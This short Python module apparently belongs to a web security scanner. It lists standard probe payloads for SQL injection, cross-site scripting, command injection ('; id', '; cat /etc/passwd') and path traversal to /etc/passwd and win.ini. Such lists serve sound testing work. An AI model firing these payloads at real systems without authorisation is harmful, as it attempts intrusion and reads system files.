# src/utils/payloads.py

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "1' OR '1'='1'--",
]

def XSS_PAYLOADS(marker: str):
    return [
        f"<script>alert('{marker}')</script>",
        f"\"><script>alert('{marker}')</script>",
        f"'><img src=x onerror=alert('{marker}')>",
    ]

CMDI_PAYLOADS = [
    "; id",
    "&& id",
    "| id",
    "; cat /etc/passwd",
]

TRAVERSAL_PAYLOADS = [
    "../" * 5 + "etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
]
